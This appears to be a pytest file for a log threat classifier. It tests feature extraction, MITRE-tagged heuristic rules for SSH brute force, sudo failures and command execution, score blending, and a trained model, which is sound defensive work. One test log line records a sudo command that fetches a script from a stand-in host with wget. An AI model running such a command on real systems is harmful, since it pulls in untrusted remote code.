"""LOG-ML-P2: log feature extraction, heuristic layer, baseline model, blend."""

import json
from pathlib import Path

import joblib
import pytest

from app.services.log_blend import blend_scores
from app.services.log_features import (
    LABELS,
    NUMERIC_FEATURES,
    extract_features,
    extract_source_entities,
    group_split,
    ngram_text,
    tokenize,
    vectorize_batch,
)
from app.services.log_heuristic import classify_heuristic

MODELS_DIR = Path(__file__).resolve().parents[1] / "models"
PKL_PATH = MODELS_DIR / "log_threat_v1.pkl"
MANIFEST_PATH = MODELS_DIR / "log_threat_v1_features.json"


# ---------------------------------------------------------------- features
def test_tokenize_and_normalize_preserves_ips_masks_literals():
    tokens = tokenize("Failed password for deploy from 183.62.140.253 port 49870 ssh2")
    assert "183.62.140.253" in tokens
    assert "deploy" in tokens
    assert "49870" in tokens
    normalized = ngram_text("Failed password for root from 183.62.140.253 blk_-1608999687919862906 22")
    assert "<ip>" in normalized and "<blk>" in normalized and "<num>" in normalized
    assert "failed" in normalized and "password" in normalized
    assert "183" not in normalized


def test_extract_features_structural():
    feats = extract_features("Failed password for invalid user admin from 203.0.113.7 port 41000 ssh2")
    assert all(name in feats for name in NUMERIC_FEATURES)
    assert feats["has_ip"] == 1
    assert feats["has_port"] == 1
    assert feats["has_username"] == 1
    assert feats["num_tokens"] == len(tokenize("Failed password for invalid user admin from 203.0.113.7 port 41000 ssh2"))
    assert feats["line_length"] > 60


def test_extract_features_temporal():
    ts_line = extract_features("2008-11-09T20:35:18 Receiving block blk_-1608999687919862906")
    assert ts_line["hour_of_day"] == 20
    assert ts_line["day_of_week"] == 6  # 2008-11-09 was a Sunday
    assert ts_line["has_time"] == 0  # ISO timestamp is not a bare HH:MM:SS token
    syslog = extract_features("Jun 14 15:16:01 combo sshd(pam_unix): authentication failure")
    assert syslog["hour_of_day"] == 15
    no_ts = extract_features("instruction cache parity error corrected")
    assert no_ts["hour_of_day"] == -1 and no_ts["day_of_week"] == -1


def test_extract_source_entities():
    hdfs = extract_source_entities("Receiving block blk_-2126554733521224025 src: /10.251.199.86:42666", "loghub_hdfs")
    assert hdfs["hdfs_block_id"] == "blk_-2126554733521224025"
    assert hdfs["ip"] == "10.251.199.86"
    bgl = extract_source_entities("R02-M1-N0-C:J12-U11 instruction cache parity error corrected", "loghub_bgl")
    assert bgl["bgl_node"] == "R02-M1-N0-C:J12-U11"
    adfa = extract_source_entities("6 91 11 45 221 221 33", "adfa_ld")
    assert adfa["syscalls"] == [6, 91, 11, 45, 221, 221, 33]


def test_vectorize_batch_fit_and_transform():
    lines = [
        "Failed password for root from 203.0.113.7 port 41000 ssh2",
        "Failed password for deploy from 198.51.100.9 port 41001 ssh2",
        "PacketResponder 1 for block blk_-1608999687919862906 terminating",
        "Receiving block blk_-1608999687919862906 src: /10.251.31.15:54106",
    ]
    sources = ["loghub_openssh"] * 2 + ["loghub_hdfs"] * 2
    matrix, names = vectorize_batch(lines, sources)  # fit path
    assert matrix.shape[0] == 4
    assert matrix.shape[1] == len(names)
    assert all(n in names for n in NUMERIC_FEATURES)
    assert "failed password" in names  # bigram survived
    from scipy.sparse import issparse

    assert issparse(matrix)
    from app.services.log_features import build_vectorizer

    v = build_vectorizer()
    v.fit_transform([ngram_text(l) for l in lines])
    single, _ = vectorize_batch(lines[:1], sources[:1], vectorizer=v)  # transform path
    assert single.shape[0] == 1 and issparse(single)


def test_group_split_keeps_keys_atomic():
    keys = [f"blk_{i}" for i in range(100)] + [f"blk_{i}" for i in range(50)]  # duplicates
    train, val, test = group_split(keys, (0.6, 0.2, 0.2), seed=7)
    assert not (train & val or train & test or val & test)
    assert len(train) + len(val) + len(test) == 100  # unique keys, no straddle
    assert abs(len(train) / 100 - 0.6) < 0.05


# ---------------------------------------------------------------- heuristic
def test_heuristic_t1110_failed_password_high():
    res = classify_heuristic("Mar 10 03:12:09 srv-auth01 sshd[4242]: Failed password for root from 198.51.100.9 port 50001 ssh2")
    assert res["severity"] == "high"
    assert res["mitre"] == ["T1110"]
    values = {i["type"]: i["value"] for i in res["indicators"]}
    assert values["source_ip"] == "198.51.100.9"
    assert values["username"] == "root"


def test_heuristic_t1078_accepted_external_medium():
    res = classify_heuristic("Mar 10 03:12:44 srv-auth01 sshd[4243]: Accepted password for deploy from 198.51.100.9 port 50002 ssh2")
    assert res["severity"] == "medium"
    assert res["mitre"] == ["T1078"]
    # private-range successes are NOT unusual
    ok = classify_heuristic("Accepted publickey for deploy from 10.0.2.5 port 41000 ssh2")
    assert ok["severity"] == "info" and ok["mitre"] == []


def test_heuristic_t1548_sudo_failure_high():
    res = classify_heuristic("Mar 10 04:00:01 srv-auth01 sudo: backup : 3 incorrect password attempts ; USER=root ; COMMAND=/bin/bash")
    assert res["severity"] == "high"
    assert res["mitre"] == ["T1548"]
    su = classify_heuristic("Mar 10 04:01:00 srv-auth01 su: FAILED SU (to root) backup on pts/2")
    assert su["severity"] == "high" and su["mitre"] == ["T1548"]


def test_heuristic_t1059_command_medium():
    res = classify_heuristic("Mar 10 04:00:02 srv-auth01 sudo: deploy : TTY=pts/0 ; USER=root ; COMMAND=/bin/sh -c wget http://203.0.113.5/x.sh")
    assert res["severity"] == "medium"
    assert res["mitre"] == ["T1059"]
    values = {i["type"]: i["value"] for i in res["indicators"]}
    assert "wget" in values["command"]


def test_heuristic_operational_and_default():
    low = classify_heuristic("instruction cache parity error corrected")
    assert low["severity"] == "low" and low["mitre"] == []
    segv = classify_heuristic("program segfault at 0 ip 00007f")
    assert segv["severity"] == "low"
    info = classify_heuristic("connection from 206.47.209.10 () at Mon Jul 25 06:39:18 2005")
    assert info["severity"] == "info" and info["indicators"] == []


# ---------------------------------------------------------------- blend
def test_blend_strong_heuristic_never_lowered():
    assert blend_scores("high", 0.05) == {"risk_score": 80, "severity": "high"}
    assert blend_scores("critical", 0.40) == {"risk_score": 95, "severity": "critical"}
    # ML can only raise the risk score, never the severity
    assert blend_scores("high", 0.99) == {"risk_score": 99, "severity": "high"}


def test_blend_weak_heuristic_raised_by_ml():
    assert blend_scores("info", 0.85) == {"risk_score": 85, "severity": "high"}
    assert blend_scores("low", 0.97) == {"risk_score": 97, "severity": "critical"}
    # below the 0.8 raise threshold the severity holds (info floors to low in output)
    assert blend_scores("info", 0.30) == {"risk_score": 30, "severity": "low"}
    assert blend_scores("medium", 0.60) == {"risk_score": 60, "severity": "medium"}
    with pytest.raises(ValueError):
        blend_scores("bogus", 0.5)


# ---------------------------------------------------------------- model + eval harness
def test_model_artifacts_and_manifest():
    assert PKL_PATH.exists() and MANIFEST_PATH.exists()
    manifest = json.loads(MANIFEST_PATH.read_text())
    assert manifest["version"] == "log_threat_v1"
    assert manifest["metrics"]["macro_f1"] > 0.7
    assert manifest["split"]["grouped"] is True and manifest["split"]["key"] == "split_key"
    assert manifest["n_features_total"] == manifest["n_text_features"] + len(NUMERIC_FEATURES)
    size_mb = PKL_PATH.stat().st_size / 1e6
    assert 0.05 < size_mb < 50  # compact corpus vocab (~3.5k) keeps it well under the 10k cap
    bundle = joblib.load(PKL_PATH)
    assert bundle["labels"] == LABELS and bundle["version"] == "log_threat_v1"


def test_eval_harness_ten_samples():
    if not PKL_PATH.exists():
        pytest.skip("log_threat_v1.pkl not trained yet")
    import sys

    sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "scripts"))
    from train_log_model_v1 import EVAL_SAMPLES, evaluate_bundle

    bundle = joblib.load(PKL_PATH)
    results = evaluate_bundle(bundle, EVAL_SAMPLES)
    assert len(results) == 10
    for row in results:
        assert row["severity"] in {"critical", "high", "medium", "low"}
        assert 0 <= row["risk_score"] <= 100
    exact = sum(1 for r in results if r["severity"] == r["expected"])
    assert exact >= 6  # misses are contract raises (medium->critical at ml>0.95) or the info->low floor
    # brute-force lines keep their MITRE tags through the harness
    assert any(r["mitre"] == ["T1110"] for r in results)
    assert any(r["mitre"] == ["T1548"] for r in results)
